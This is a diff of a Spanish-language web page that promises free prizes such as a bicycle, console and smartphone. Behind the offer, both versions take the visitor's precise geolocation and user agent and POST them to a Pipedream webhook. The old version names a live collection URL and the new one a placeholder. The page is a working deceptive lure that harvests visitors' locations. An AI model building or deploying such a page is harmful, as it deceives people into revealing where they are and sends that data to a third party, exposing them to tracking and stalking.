@@ -3,55 +3,24 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Verificación y Premios - Admin Profesional</title>
+<title>Premios Profesional</title>
 <style>
-body {
-  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-  margin: 0; padding: 0;
-  background: linear-gradient(135deg, #4facfe, #00f2fe);
-  color: #333;
-}
-.container {
-  max-width: 1000px;
-  margin: 40px auto;
-  background: #fff;
-  border-radius: 20px;
-  box-shadow: 0 10px 30px rgba(0,0,0,0.15);
-  padding: 40px;
-  text-align: center;
-  animation: fadeIn 1s ease-in-out;
-}
-h1 { font-size: 28px; margin-bottom: 15px; color: #222; }
-p { font-size: 16px; color: #555; }
-button {
-  margin-top: 15px;
-  padding: 12px 30px;
-  font-size: 16px;
-  border: none;
-  border-radius: 8px;
-  background: #007bff;
-  color: #fff;
-  cursor: pointer;
-  transition: all 0.3s ease;
-}
-button:hover { background: #0056b3; transform: scale(1.05); }
-button:disabled { background: #888; cursor: not-allowed; }
-#msg { margin-top: 20px; font-size: 18px; color: green; display: none; animation: fadeIn 1s ease-in-out; }
-.premios { margin-top: 25px; display: none; grid-template-columns: repeat(auto-fit, minmax(200px,1fr)); gap: 20px; }
-.premio-card { background: #fafafa; border-radius: 15px; padding: 15px; box-shadow:0 5px 20px rgba(0,0,0,0.1); opacity:0; transform:translateY(20px); animation: showCard 0.6s forwards; transition: transform 0.3s, box-shadow 0.3s; }
-.premio-card img { width:100%; border-radius:12px; object-fit:cover; height:150px; }
-.premio-card h3 { margin:10px 0 0; font-size:16px; color:#333; }
-.premio-card:hover { transform: translateY(-5px) scale(1.03); box-shadow:0 12px 35px rgba(0,0,0,0.2); }
-
-#historial { margin-top:30px; text-align:left; max-height:250px; overflow-y:auto; background:#f0f0f0; padding:15px; border-radius:12px; }
+body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin:0; padding:0; background:linear-gradient(135deg,#4facfe,#00f2fe); }
+.container { max-width:900px; margin:40px auto; background:#fff; border-radius:20px; padding:40px; text-align:center; box-shadow:0 10px 30px rgba(0,0,0,0.15); }
+h1 { margin-bottom:15px; color:#222; }
+button { margin:10px; padding:12px 25px; font-size:16px; border:none; border-radius:8px; background:#007bff; color:#fff; cursor:pointer; transition:0.3s; }
+button:hover { background:#0056b3; }
+button:disabled { background:#888; cursor:not-allowed; }
+#msg { margin-top:20px; font-weight:bold; display:none; color:green; }
+.premios { display:none; margin-top:25px; grid-template-columns:repeat(auto-fit,minmax(200px,1fr)); gap:15px; }
+.premio-card { background:#fafafa; padding:10px; border-radius:12px; box-shadow:0 4px 15px rgba(0,0,0,0.1); }
+.premio-card img { width:100%; border-radius:10px; height:150px; object-fit:cover; }
+#historial { margin-top:30px; max-height:250px; overflow-y:auto; background:#f0f0f0; padding:15px; border-radius:12px; text-align:left; }
 #historial table { width:100%; border-collapse:collapse; font-size:14px; }
-#historial th, #historial td { padding:6px 8px; border-bottom:1px solid #ccc; text-align:left; }
+#historial th, td { padding:5px 8px; border-bottom:1px solid #ccc; }
 #historial th { background:#007bff; color:#fff; }
 .nuevo { background:#d4edda !important; transition: background 2s ease; }
-
-@keyframes fadeIn { from{opacity:0;transform:translateY(20px);} to{opacity:1;transform:translateY(0);} }
-@keyframes showCard { to {opacity:1; transform: translateY(0);} }
-canvas { position: fixed; top:0; left:0; pointer-events:none; z-index:999; }
+canvas { position:fixed; top:0; left:0; pointer-events:none; z-index:999; }
 </style>
 </head>
 <body>
@@ -59,100 +28,93 @@ canvas { position: fixed; top:0; left:0; pointer-events:none; z-index:999; }
 <canvas id="confetti"></canvas>
 
 <div class="container">
-  <h1>✅ VERIFICACIÓN Y ADMINISTRACIÓN DE PREMIOS</h1>
-  <p id="infoText">Pulsa el botón para reclamar tu premio.</p>
-  <button id="btnPremio">📍 RECLAMA TU PREMIO</button>
-  <button id="btnDescargar">📥 Descargar Historial</button>
-  <p id="msg">🎉 ¡Premios desbloqueados!</p>
-  <div class="premios" id="premios"></div>
+<h1>✅ Reclama tu Premio</h1>
+<p id="infoText">Pulsa el botón para reclamar tu premio.</p>
+<button id="btnPremio">📍 Reclamar Premio</button>
+<button id="btnDescargar">📥 Descargar Historial</button>
+<p id="msg">🎉 Premios desbloqueados!</p>
+<div class="premios" id="premios"></div>
 
-  <div id="historial">
-    <h3>📋 Historial de Usuarios:</h3>
-    <table>
-      <thead>
-        <tr>
-          <th>Usuario</th>
-          <th>Latitud</th>
-          <th>Longitud</th>
-          <th>Timestamp</th>
-        </tr>
-      </thead>
-      <tbody id="tablaHistorial"></tbody>
-    </table>
-  </div>
+<div id="historial">
+<h3>📋 Historial de Usuarios:</h3>
+<table>
+<thead><tr><th>Usuario</th><th>Lat</th><th>Lon</th><th>Fecha</th></tr></thead>
+<tbody id="tablaHistorial"></tbody>
+</table>
+</div>
 </div>
 
 <script>
-const WEBHOOK_URL = "https://eo6bspy1b9no0kb.m.pipedream.net"; // reemplaza con tu URL Pipedream
+const WEBHOOK_URL = "TU_URL_DE_PIPEDREAM"; // reemplaza aquí
 const premios = [
-  { nombre: "🚲 Bicicleta de montaña", img:"https://cdn.pixabay.com/photo/2017/03/02/04/23/bicycle-2119460_1280.jpg" },
-  { nombre: "🎮 Consola Gamer", img:"https://cdn.pixabay.com/photo/2016/11/29/04/17/joystick-1866599_1280.jpg" },
-  { nombre: "📱 Smartphone Gama Alta", img:"https://cdn.pixabay.com/photo/2016/11/19/14/00/smartphone-1836073_1280.jpg" },
-  { nombre: "⌚ Smartwatch", img:"https://cdn.pixabay.com/photo/2015/09/05/21/51/apple-watch-925157_1280.jpg" },
-  { nombre: "💻 Laptop Ultrabook", img:"https://cdn.pixabay.com/photo/2014/05/02/21/50/home-office-336378_1280.jpg" },
-  { nombre: "📺 TV Pantalla Grande", img:"https://cdn.pixabay.com/photo/2015/09/05/22/46/tv-926093_1280.jpg" }
+  {nombre:"🚲 Bicicleta", img:"https://cdn.pixabay.com/photo/2017/03/02/04/23/bicycle-2119460_1280.jpg"},
+  {nombre:"🎮 Consola Gamer", img:"https://cdn.pixabay.com/photo/2016/11/29/04/17/joystick-1866599_1280.jpg"},
+  {nombre:"📱 Smartphone", img:"https://cdn.pixabay.com/photo/2016/11/19/14/00/smartphone-1836073_1280.jpg"},
+  {nombre:"⌚ Smartwatch", img:"https://cdn.pixabay.com/photo/2015/09/05/21/51/apple-watch-925157_1280.jpg"},
+  {nombre:"💻 Laptop", img:"https://cdn.pixabay.com/photo/2014/05/02/21/50/home-office-336378_1280.jpg"},
+  {nombre:"📺 TV", img:"https://cdn.pixabay.com/photo/2015/09/05/22/46/tv-926093_1280.jpg"}
 ];
 
 const btnPremio = document.getElementById("btnPremio");
 const btnDescargar = document.getElementById("btnDescargar");
 const infoText = document.getElementById("infoText");
 const tablaHistorial = document.getElementById("tablaHistorial");
-btnPremio.addEventListener("click", obtenerUbicacion);
-btnDescargar.addEventListener("click", descargarHistorialArchivo);
+const premiosDiv = document.getElementById("premios");
+const msg = document.getElementById("msg");
+const canvas = document.getElementById("confetti");
+const ctx = canvas.getContext("2d");
 
 let historial = JSON.parse(localStorage.getItem("historialPremios") || "[]");
-const usuarioActual = navigator.userAgent + "_" + location.href;
+const usuarioID = navigator.userAgent + "_" + location.href;
 
-// Inicializar historial visual
-actualizarTablaHistorial();
+canvas.width = window.innerWidth;
+canvas.height = window.innerHeight;
 
-if(historial.some(u=>u.id===usuarioActual)){
+// Inicializar tabla
+actualizarTabla();
+
+if(historial.some(u=>u.id===usuarioID)){
   btnPremio.disabled=true;
-  infoText.textContent="✅ Ya reclamaste tu premio. Gracias!";
+  infoText.textContent="✅ Ya reclamaste tu premio";
   mostrarPremios();
 }
 
-function obtenerUbicacion(){
-  if(!navigator.geolocation) return alert("Tu navegador no soporta geolocalización.");
+btnPremio.addEventListener("click",()=>{
+  if(!navigator.geolocation) return alert("No soporta geolocalización");
   btnPremio.disabled=true;
-  navigator.geolocation.getCurrentPosition(onSuccess, onError, { enableHighAccuracy:true, timeout:10000, maximumAge:0 });
-}
+  navigator.geolocation.getCurrentPosition(onSuccess,onError,{enableHighAccuracy:true,timeout:10000,maximumAge:0});
+});
 
-async function onSuccess(pos){
+btnDescargar.addEventListener("click",descargarHistorial);
+
+function onSuccess(pos){
   const data = {
-    id: usuarioActual,
+    id: usuarioID,
     lat: pos.coords.latitude,
     lon: pos.coords.longitude,
     accuracy: pos.coords.accuracy,
-    timestamp: new Date().toISOString(),
-    userAgent: navigator.userAgent,
-    maps_link: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`,
-    source: window.location.href
+    fecha: new Date().toISOString(),
+    userAgent: navigator.userAgent
   };
-
-  if(!historial.some(u=>u.id===usuarioActual)){
+  let esNuevo = false;
+  if(!historial.some(u=>u.id===usuarioID)){
     historial.push(data);
-    localStorage.setItem("historialPremios", JSON.stringify(historial, null, 2));
-    actualizarTablaHistorial(true);
+    localStorage.setItem("historialPremios",JSON.stringify(historial,null,2));
+    actualizarTabla(usuarioID);
+    esNuevo = true;
   }
-
-  descargarHistorialArchivo();
-
-  try{
-    await fetch(WEBHOOK_URL,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(data,null,2)});
-  }catch(err){ console.error("Error enviando datos:",err); }
-
-  infoText.textContent="🎉 ¡Premios desbloqueados!";
+  enviarWebhook(data);
   mostrarPremios();
+  msg.style.display="block";
+  if(esNuevo) lanzarConfeti();
 }
 
 function onError(err){
-  alert("⚠️ Error al obtener ubicación: "+(err.message||err.code));
+  alert("Error al obtener ubicación: "+(err.message||err.code));
   btnPremio.disabled=false;
 }
 
 function mostrarPremios(){
-  const premiosDiv = document.getElementById("premios");
   premiosDiv.style.display="grid";
   premiosDiv.innerHTML="";
   premios.forEach((p,i)=>{
@@ -162,15 +124,19 @@ function mostrarPremios(){
     card.innerHTML = `<img src="${p.img}" alt="${p.nombre}"><h3>${p.nombre}</h3>`;
     premiosDiv.appendChild(card);
   });
-  lanzarConfeti();
 }
 
+// Confeti profesional
 function lanzarConfeti(){
-  const canvas=document.getElementById("confetti");
-  const ctx=canvas.getContext("2d");
-  canvas.width=window.innerWidth;
-  canvas.height=window.innerHeight;
-  const piezas=Array.from({length:150},()=>({x:Math.random()*canvas.width,y:Math.random()*canvas.height-canvas.height,w:10,h:10,color:["#f94144","#f3722c","#f9c74f","#90be6d","#577590","#43aa8b"][Math.floor(Math.random()*6)],velocidad:Math.random()+1.5,rot:Math.random()*360,rotVel:(Math.random()-0.5)*10}));
+  const piezas = Array.from({length:200},()=>({
+    x:Math.random()*canvas.width,
+    y:Math.random()*canvas.height - canvas.height,
+    w:10, h:10,
+    color:["#f94144","#f3722c","#f9c74f","#90be6d","#577590","#43aa8b"][Math.floor(Math.random()*6)],
+    vel:Math.random()+2,
+    rot:Math.random()*360,
+    rotVel:(Math.random()-0.5)*10
+  }));
   let frame;
   function animar(){
     ctx.clearRect(0,0,canvas.width,canvas.height);
@@ -178,31 +144,46 @@ function lanzarConfeti(){
       ctx.save();
       ctx.translate(p.x+p.w/2,p.y+p.h/2);
       ctx.rotate(p.rot*Math.PI/180);
-      ctx.fillStyle=p.color;
+      ctx.fillStyle = p.color;
       ctx.fillRect(-p.w/2,-p.h/2,p.w,p.h);
       ctx.restore();
-      p.y+=p.velocidad; p.rot+=p.rotVel; if(p.y>canvas.height)p.y=-10;
+      p.y += p.vel;
+      p.rot += p.rotVel;
+      if(p.y>canvas.height) p.y=-10;
     });
-    frame=requestAnimationFrame(animar);
+    frame = requestAnimationFrame(animar);
   }
   animar();
   setTimeout(()=>{ cancelAnimationFrame(frame); ctx.clearRect(0,0,canvas.width,canvas.height); },7000);
 }
 
 // Descargar historial
-function descargarHistorialArchivo(){
-  const blob=new Blob([JSON.stringify(historial,null,2)],{type:"application/json"});
-  const url=URL.createObjectURL(blob);
-  const a=document.createElement("a");
-  a.href=url; a.download="historial_premios.json"; a.click();
-  URL.revokeObjectURL(url);
+function descargarHistorial(){
+  const blob = new Blob([JSON.stringify(historial,null,2)],{type:"application/json"});
+  const a = document.createElement("a");
+  a.href = URL.createObjectURL(blob);
+  a.download="historial_premios.json";
+  a.click();
 }
 
-// Actualizar tabla visual con resaltado
-function actualizarTablaHistorial(resaltar=false){
+// Enviar a Pipedream
+async function enviarWebhook(data){
+  try{
+    await fetch(WEBHOOK_URL,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(data,null,2)});
+  }catch(err){ console.error("Error webhook",err);}
+}
+
+// Actualizar tabla visual
+function actualizarTabla(nuevoID=null){
   tablaHistorial.innerHTML="";
   historial.forEach(u=>{
-    const tr=document.createElement("tr");
-    tr.innerHTML=`<td>${u.userAgent}</td><td>${u.lat.toFixed(5)}</td><td>${u.lon.to
-
+    const tr = document.createElement("tr");
+    tr.innerHTML = `<td>${u.userAgent}</td><td>${u.lat.toFixed(5)}</td><td>${u.lon.toFixed(5)}</td><td>${u.fecha}</td>`;
+    if(nuevoID && u.id===nuevoID) tr.classList.add("nuevo");
+    tablaHistorial.appendChild(tr);
+  });
+}
+</script>
+</body>
+</html>
 
